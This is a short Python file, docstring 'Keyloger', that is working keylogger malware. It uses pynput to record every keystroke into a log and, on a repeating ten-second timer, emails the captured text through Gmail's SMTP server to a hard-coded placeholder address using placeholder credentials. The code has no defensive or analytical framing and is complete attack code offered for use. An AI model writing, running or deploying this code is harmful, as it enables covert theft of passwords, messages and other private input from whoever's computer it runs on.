"""Keyloger."""
import ssl
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from smtplib import SMTP

from pynput import keyboard

log = ""


def on_press_call_back_function(key):
    """Press enter any kays."""
    global log
    try:
        log += str(key.char)
        print(log)
    except AttributeError:
        if key == keyboard.Key.space:
            log = log + " "
        else:
            log += str(key)
    except:
        log += str(key)


def send_mail(email: str, password: str, body: str):
    """Send to email.

    Args:
        email (str): email address
        password (str): password
        body (str): message body

    Returns:
        _type_: _SendError
    """
    context = ssl.create_default_context()

    with SMTP("smtp.gmail.com", 587) as smtp:
        smtp.ehlo()
        smtp.starttls(context=context)
        smtp.login(email, password)

        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = email
        msg["Subject"] = "Keylogger"
        msg.attach(MIMEText(body, "plain", "utf-8"))

        # msg = "Subject: " + subject + "\n" + body
        result = smtp.sendmail(from_addr=email, to_addrs=email, msg=msg.as_string())
        body = ""
        return result


def thread_function():
    global log
    send_mail("mail.address@gmail.com", "password", log)
    log = ""
    threading_object = threading.Timer(10, thread_function)
    threading_object.start()


with keyboard.Listener(on_press=on_press_call_back_function) as listener:
    thread_function()
    listener.join()
